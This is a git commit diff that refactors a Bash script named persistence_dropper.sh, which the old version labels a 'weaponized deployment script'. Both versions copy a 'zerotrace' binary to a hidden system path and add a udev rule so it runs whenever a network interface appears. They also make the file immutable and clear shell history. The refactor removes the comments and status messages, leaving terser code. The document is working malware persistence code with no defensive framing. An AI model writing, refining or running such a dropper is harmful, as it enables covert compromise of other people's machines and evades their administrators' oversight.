0d0bf0e152250c3dd4de41ddf8d5164c8e68aefb
C4rbn <mokshanbasuru@gmail.com>
2026-04-30 07:08:10 +0530

    Refactor persistence dropper script for clarity

--- persistence_dropper.sh
+++ persistence_dropper.sh
@@ -1,18 +1,8 @@
 #!/bin/bash
-# Weaponized Deployment Script
-BIN_PATH="./target/release/zerotrace"
-INSTALL_DEST="/usr/local/bin/.sys_vfs_cache"
-
-echo "[*] Deploying Agent..."
-cp $BIN_PATH $INSTALL_DEST
-chmod +x $INSTALL_DEST
-
-# Persistence via UDEV Network Trigger
-echo 'SUBSYSTEM=="net", ACTION=="add", KERNEL=="eth*", RUN+="'$INSTALL_DEST'"' > /etc/udev/rules.d/10-local.rules
-
-# Hide from Disk listing (Immutable)
-chattr +i $INSTALL_DEST
-
-# Clean logs
+B="./target/release/zerotrace"
+D="/usr/local/bin/.sys_vfs_cache"
+cp $B $D
+chmod +x $D
+echo 'SUBSYSTEM=="net", ACTION=="add", KERNEL=="eth*", RUN+="'$D'"' > /etc/udev/rules.d/10-local.rules
+chattr +i $D
 history -c
-echo "[*] Agent Active and Persistent."
